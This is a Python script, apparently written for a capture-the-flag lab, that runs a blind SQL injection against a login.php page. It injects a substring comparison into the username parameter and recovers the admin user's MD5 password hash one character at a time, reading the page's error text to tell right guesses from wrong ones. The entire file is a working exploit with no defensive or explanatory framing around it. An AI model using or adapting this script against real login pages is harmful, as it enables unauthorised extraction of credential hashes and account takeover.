import requests 

loginPage = 'http://10.10.10.73/login.php'
extractedHash = ''
# Loop 32 times - length of the MD5 hash 
i = 1
while i <= 32 :
    # Loop over the MD5 character set
    MD5Characters = "abcdef0123456789" 
    for char in MD5Characters:
        # injection into username parameter, each time we brute force the current hash character
        parameters = {'username': "admin' and substring(password, "+str(i)+", 1) = '"+ char + "' -- -",'password':''}
        # save the response into an object
        response = requests.post(loginPage,data=parameters)
        # getting the html content from response object
        html =  response.text
        # Check BlindSQLi Cases : 
        # 1 - "Try again" case: is the false case for BlindSQLi (injected the wrong hash char, so we will skip this char) 
        # 2 - In else case: the application will response with "Wrong identification", which means we used the correct username, and the injected char is used in user password hash , so we will save this char into a variable
        if (html.find("Try again..") != -1):
            #print("False Case")
            pass
        else:
            #print("True Case")
            print("[+] Current Position is %d and the Extracted Char is %s " %(i,char))
            extractedHash += char
            break
    i+=1    
print ("[++] The hash of the admin user is :" + extractedHash)
